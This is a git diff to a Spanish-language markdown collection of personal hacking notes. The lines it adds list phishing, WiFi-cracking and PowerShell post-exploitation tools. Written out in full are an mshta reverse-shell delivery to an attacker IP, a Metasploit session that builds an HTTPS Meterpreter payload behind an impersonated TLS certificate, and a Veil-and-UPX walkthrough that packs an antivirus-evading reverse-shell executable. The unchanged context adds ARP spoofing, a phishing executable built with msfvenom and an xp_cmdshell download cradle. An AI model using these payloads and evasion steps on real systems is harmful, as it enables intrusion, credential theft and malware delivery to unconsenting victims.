@@ -74,6 +74,7 @@ Estas son las notas que he ido cogiendo desde que empecé a aprender sobre hacki
 	- [**Evilginx**](https://github.com/kgretzky/evilginx2)
 	- [**Zphisher**](https://github.com/htr-tech/zphisher)
 	- [**SocialPhish**](https://github.com/xHak9x/SocialPhish)
+	- [**Social Engineer Toolkit**](https://github.com/trustedsec/social-engineer-toolkit)
 - Para resolver peticiones DNS podemos usar `nslookup` o `dig`
 	- Zone transfer con `dig`: `dig axfr example.com @DNS-SERVER-ADDR`
 	- Zone transfer con `dig` (Reverse lookup): `dig axfr -x 192.168 @DNS-SERVER-ADDR`
@@ -83,6 +84,7 @@ Estas son las notas que he ido cogiendo desde que empecé a aprender sobre hacki
 - [**Olevba**](https://github.com/decalage2/oletools/wiki/olevba)**:** Script para buscar macros en documentos office
 - En redes con switches necesitaremos hacer ARP poisoning para poder hacer sniff de paquetes (Man in the middle):
 ```console
+# https://www.kali.org/tools/dsniff/
 echo 1 > /proc/sys/net/ipv4/ip_forward # Activa la redirección de paquetes en el kernel de Linux para evitar problemas de comunicación entre las víctimas
 arpspoof -i eht0 -t <VICTIM_IP_A> -r <VICTIM_IP_B>
 ```
@@ -143,6 +145,13 @@ Trabajan a 125 khz o 13.56 Mhz. Se puede leer la información de una tarjeta de 
 	- **hcxpcaptool:** Lo mismo que el otro pero sacando el PMKID
 - **cap2hccapx:** Cambio de formato de captura a hashcat
 - **hashcat:** Usa varios ataques de fuerza bruta (Comando para esto: hashcat -m2500 (Para PMK) (-m16800 para PKMID) -a3 -w3 file)
+- [**Kismet**](https://www.kismetwireless.net/)**:** Detector de redes y dispositivos wireless, sniffer, herramienta de wardriving y un framework WIDS (wireless intrusion detection)
+- [**Aircrack-ng**](https://www.aircrack-ng.org/)**:** Completo conjunto de herramientas para evaluar la seguridad de redes WIFI
+- [**Airgeddon**](https://github.com/v1s1t0r1sh3r3/airgeddon)**:** Framework para realizar auditorias WiFi
+- [**Eaphammer**](https://github.com/s0lst1c3/eaphammer)**:** Conjunto de herramientas para realizar ataques de Evil Twin a redes WPA2-Enterprise
+- [**Wigle**](https://wigle.net/tools)**:** Herramienta para hacer wardriving
+- [**Wifiphisher**](https://github.com/wifiphisher/wifiphisher)**:** Framework para realizar auditorias Wi-Fi con puntos de acceso falsos
+- [**Wifite2**](https://github.com/derv82/wifite2)**:** Diseñado para lanzar todos los métodos conocidos para obtener la contraseña de un punto de acceso wireless
 
 # SDR (Radio Hacking):
 Radio en la cual alguna o varias de las funciones de la capa física son definidas mediante software: filtros, mezcladores, amplificadores...
@@ -184,7 +193,7 @@ Radio en la cual alguna o varias de las funciones de la capa física son definid
 - **hashid:** Identifica un hash
 - **hashcat:** Usa varios ataques de fuerza bruta
 - [**colabcat**](https://github.com/someshkar/colabcat)**:** Ejecuta hashcat en Google Colab
-- [**Hydra**](https://github.com/vanhauser-thc/thc-hydra)**:** Permite realizar diferentes tipos de fuerza bruta
+- [**Hydra**](https://github.com/vanhauser-thc/thc-hydra)**:** Permite realizar diferentes tipos de fuerza bruta ([Cheatsheet](https://github.com/frizb/Hydra-Cheatsheet))
 - **filemyhash:** Programa para descifrar un hash (base de datos)
 - **hashidentifier:** Programa para identificar tipo de hash
 - **dcode.fr:** Página para codificar y decodificar diferentes tipos de algoritmos de cifrado
@@ -200,6 +209,7 @@ Para crackear contraseñas necesitaremos diccionarios, aquí dejo algunas opcion
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 - **Crunch y Cewl:** Para creación de diccionarios
 - [**Mentalist**](https://github.com/sc0tfree/mentalist)**:** Herramienta gráfica para la generación de diccionarios
+- [**RSMangler**](https://github.com/digininja/RSMangler)**:** Permite generar diccionarios a partir de un conjunto de palabras
 
 ### Reglas
 Si se combina un buen diccionario con un buen conjunto de reglas las posibilidades de éxito aumentan:
@@ -370,6 +380,7 @@ Anthares101@kali:~$ hashcat -m 13400 -a 0 -w 1 fichero diccionario --force --sho
 - [**CeWL**](https://github.com/digininja/CeWL)**:** Generador de diccionarios personalizados. Analiza una URL especifica con una determinada profundidad y genera un diccionario con las palabras que considera relevantes
 - [**Wfuzz**](https://github.com/xmendez/wfuzz)**:** Facilita el fuzzing web
 - [**Feroxbuster**](https://github.com/epi052/feroxbuster)**:** Enumerador de directorios recursivo y que ademas facilita entre otras cosas encontrar archivos de backup
+- [**EyeWitness**](https://github.com/FortyNorthSecurity/EyeWitness)**:** Diseñado para tomar capturas de los sitios webs especificados, proveer información de las cabeceras del servidor e intentar identificar si se estan utilizando credenciales por defecto en aplicaciones conocidas
 
 ## Ataques
 
@@ -561,7 +572,7 @@ Usaremos OSSTM (Metodologia abierta de Comprobación y Seguridad), básicamente 
 - **MBSA:** Algo obsoleto pero se puede bajar para escanear nuestro PC Windows en busca de brechas de seguridad
 - [**gobuster**](https://github.com/OJ/gobuster)**:** Para sacar todos los directorios de una web
 - [**Nikto**](https://github.com/sullo/nikto)**:** Escaner de vulnerabilidades web: Escaner de vulnerabilidades web
-- **enum4linux:** Para pillar info de hosts Windows y Samba
+- **enum4linux o smbmap:** Para pillar info de hosts Windows y Samba
 - **showmount:** En el caso de tener un puerto con el servicio NFS, puede mostrar con el parámetro `-e` si hay algún directorio montado
 - **smbclient:**
 	- **`smbclient -N -L //IP/`:** Para listar directorios de un server samba windows.
@@ -634,6 +645,16 @@ $ script -qc /bin/bash /dev/null
 		- **`run post/multi/recon/local_exploit_suggester`:** Para ver que podemos usar para subir privilegios
 		- **`run post/windows/manage/enable_rdp`:** Para abrir el control de escritorio remoto
 		- **`run autoroute -h`:** Permite usar como gateway la máquina victima para acceder a otras partes de la red
+	- Para obtener una reverse shell directamente con una petición del navegador:
+	  ```
+	  # En Metasploit
+	  use exploit/windows/misc/hta_server
+	  set LHOST 443 # Opciona, puede ayudar en ocasiones
+	  exploit
+
+	  # En la victima
+	  mshta.exe http://<IP_ATACANTE>:8080/<NOMBRE_GENERADO>.hpa
+	  ```
 	- Veamos como crear una reverve shell con un payload staged (Necesitará un handler especifico pero será más pequeño) utilizando phishing a un sistema Windows:
 		1. Usamos `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATACKER_IP> LPORT=53 -f exe -o NotAShell.exe` para crear el ejecutable que mandaremos
 		2. Deberemos ahora lanzar Metasploit y esperar a que alguien ejecute el archivo creado antes:
@@ -651,13 +672,105 @@ $ script -qc /bin/bash /dev/null
 		2. Una vez con eso hecho, vamos al fichero `/etc/proxychains.conf` y añadimos una linea de que proxy usar (Ejemplo: `socks4 127.0.0.1 8080`)
 		3. Con el comando `proxychains` delante de cualquier comando podremos mandar dicho comando a traves de nuestro proxy
 	- Se podría crear un script para metasploit y agilizar procesos que se usen mucho `msfconsole -r resourcescript.rc`
+	- Para evitar posibles IDs/IPs se puede hacer lo siguiente para evitar que Metasploit utilice su certificado TLS con el módulo `exploit/multi/handler` al usar payloads HTTPS:
+		1.  Usando `auxiliary/gather/impersonate_ssl` se copia un certificado TLS de un determinado sitio web
+		2. Ahora para generar el payload de Meterpreter los haremos desde la propia consola de Metasploit (La ruta al certificado TLS te la da el propio `auxiliary/gather/impersonate_ssl` al terminar):
+		   ```
+		   msf payload(reverse_http) > use payload/windows/meterpreter/reverse_https
+		   msf payload(reverse_https) > set stagerverifysslcert true
+		   stagerverifysslcert => true
+	       msf payload(reverse_https) > set HANDLERSSLCERT /home/kali/.msf4/loot/20220807124850_default_2.17.153.99_2.17.153.99_pem_696944.pem
+		   HANDLERSSLCERT => /home/kali/.msf4/loot/20220807124850_default_2.17.153.99_2.17.153.99_pem_696944.pem
+		   msf payload(reverse_https) > set LHOST 10.0.2.15
+		   LHOST => 10.0.2.15
+		   msf payload(reverse_https) > set LPORT 8080
+		   LPORT => 8080
+		   msf payload(reverse_https) > generate -f exe -o /tmp/payload.exe
+		   [*] Writing 73802 bytes to /tmp/payload.exe...
+		   ```
+		3. Por último toca preparar el módulo `exploit/multi/handler`:
+		   ```
+		   msf payload(reverse_https) > use exploit/multi/handler 
+           msf exploit(handler) > set LHOST 10.0.2.15
+		   LHOST => 10.0.2.15
+		   msf exploit(handler) > set LPORT 8080
+		   LPORT => 8080
+		   msf exploit(handler) > set HANDLERSSLCERT /home/kali/.msf4/loot/20220807124850_default_2.17.153.99_2.17.153.99_pem_696944.pem
+		   HANDLERSSLCERT => /home/kali/.msf4/loot/20220807124850_default_2.17.153.99_2.17.153.99_pem_696944.pem
+		   msf exploit(handler) > set stagerverifysslcert true
+		   stagerverifysslcert => true
+		   msf exploit(handler) > exploit -j
+
+		   [*] Exploit running as background job.
+		   ```
+	- [**PowerSploit**](https://github.com/PowerShellMafia/PowerSploit)**:** Conjunto de módulos Powershell (Incluye PowerUp y PowerView) que puedes importar con el módulo de Powershell para realizar diversas acciones en máquinas Windows
+	- [**Nishang**](https://github.com/samratashok/nishang)**:** Nishang es un framework y colección de scripts y payloads
+	- [**PowerLurk**](https://github.com/Sw4mpf0x/PowerLurk)**:** Conjunto de herramientas para crear suscripciones maliciosas a eventos WMI (Para conseguir persistencia)
+	- [**Posh-SecMod**](https://github.com/darkoperator/Posh-SecMod)**:** Otro conjunto de módulos Powershell que pueden ser interesantes (Powershell v3 solo)
+	- [**Psgetsystem**](https://github.com/decoder-it/psgetsystem)**:** Script de Powershell para conseguir SYSTEM usando un proceso como padre
+	- Si el comando `getsystem` de Meterpreter no consigue escalar puede que se necesite hace un bypass a UAC. En Metasploit hay algunos módulos que podrían ayudar con esto, usa el módulo `post/multi/recon/local_exploit_suggester` para comprobar si alguno vale. En caso de no poder realizar el bypass con Metasploit, siempre queda [UACME](https://github.com/hfiref0x/UACME)
+	- Con el módulo `exploit/multi/script/web_delivery` se puede preparar un servidor web con un payload que será ejecutado en el momento que se lance en la víctima el comando proporcionado por Metasploit
+	- En el caso de tener que evitar un AV se puede utilizar [Veil](https://github.com/Veil-Framework/Veil) junto al empaquetador [UPX](https://upx.github.io/). Lo primero es abrir Veil y generar un ejecutable de Meterpreter:
+      ```bash
+      ...
+      Veil>: use 1
+      ...
+	  Veil/Evasion>: use python/meterpreter/rev_tcp.py
+	  [python/meterpreter/rev_tcp>>]: set LHOST 172.16.5.101
+	  [python/meterpreter/rev_tcp>>]: generate
+	  ===============================================================================
+	                                     Veil-Evasion
+	  ===============================================================================
+	        [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+	  ===============================================================================
+  
+  	   [>] Please enter the base name for output files (default is payload): hello
+  	  ===============================================================================
+	                                     Veil-Evasion
+	  ===============================================================================
+	        [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+	  ===============================================================================
+
+	   [?] How would you like to create your payload executable?
+
+	       1 - PyInstaller (default)
+	       2 - Py2Exe
+
+	   [>] Please enter the number of your choice: 1
+	  ...
+	  ===============================================================================
+	                                   Veil-Evasion
+	  ===============================================================================
+	        [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+	  ===============================================================================
+
+	   [*] Language: python
+	   [*] Payload Module: python/meterpreter/rev_tcp
+	   [*] Executable written to: /var/lib/veil/output/compiled/hello.exe
+	   [*] Source code written to: /var/lib/veil/output/source/hello.py
+	   [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/hello.rc
+
+	  Hit enter to continue...
+      ```
+      Por último, utilizando UPX se comprime el ejecutable:
+      ```bash
+      ┌──(rootkali)-[~]
+	  └─# mv /var/lib/veil/output/compiled/hello.exe hello_world.exe
+
+	  ┌──(rootkali)-[~]
+	  └─# upx --best --ultra-brute -o hello_sneak.exe hello_world.exe
+      ```
+      El payload que se debe usar en el handler de Metasploit en este caso sería `windows/meterpreter/reverse_tcp`
 - [**Armitage**](https://github.com/rsmudge/armitage)**:** GUI para metasploit
 - [**Hydra**](https://github.com/vanhauser-thc/thc-hydra)**:** Buscar contraseñas por fuerza bruta a tavés de un protocolo o web
+- [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)**:** SessionGopher es una herramienta de PowerShell que busca y descodifica sesiones guardadas para herramientas de acceso remoto
 - [**linpeas/winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)**:** Saca info de la máquina para ver como escalar
 - Para mirar que permisos tenemos en Windows podemos ejecutar: `whoami /priv`. Si tenemos `SeImpersonatePrivilege` o `SeImpersonatePrivilege` posiblemente podamos escalar privilegios fácilmente
 - [**Seatbelt**](https://github.com/GhostPack/Seatbelt)**:** Parecido al anterior pero solo con Windows. [Aquí](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) se pueden descargar los .exe ya compilados
 	- Si Seatbelt pilla que una cuenta tiene las credenciales guardadas en el Gestor de Credenciales de Windows podemos ejecutar comandos como dicha cuenta de la siguiente manera: `runas /savecred /user:<usario> /profile "cmd.exe"`
 - [**John the Ripper**](https://github.com/openwall/john)**:** Permite crackear un montón de tipos de contraseñas.
+- [**Invoke-CradleCrafter**](https://github.com/danielbohannon/Invoke-CradleCrafter)**:** Permite generar payloads ofuscados para ejecutar desde Powershell
+- [**Invoke-Obfuscation**](https://github.com/danielbohannon/Invoke-Obfuscation)**:** Permite ofuscar payloads the Powershell
 - **ReverShell desde server SQL:**
 	- Con este comando: `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"` se puede ejecutar
 la shell reversa que tenemos en el equipo desde server SQL vulnerable. 
@@ -673,3 +786,4 @@ la shell reversa que tenemos en el equipo desde server SQL vulnerable.
 	- [**Starkiller**](https://github.com/BC-SECURITY/Starkiller)**:** Frontend para Powershell Empire
 - [**CrackMapExec**](https://github.com/byt3bl33d3r/CrackMapExec)**:** Herramienta de Post-Explotación que, entre otras cosas, permite comprobar a que máquinas tenemos acceso especificando usuario y contraseña (En plano o el hash) en redes Active Directory
 - [**Evil-WinRM**](https://github.com/Hackplayers/evil-winrm)**:** Permite la conexión a una máquina Windows usando el Gestor Remoto de Windows. Se puede usar el hash NT en vez de una contraseña en texto plano para iniciar sesión
+- [**3snake**](https://github.com/blendin/3snake)**:** Extrae credenciales de memoria de las llamadas a sistema de los procesos `sudo` y `sshd`
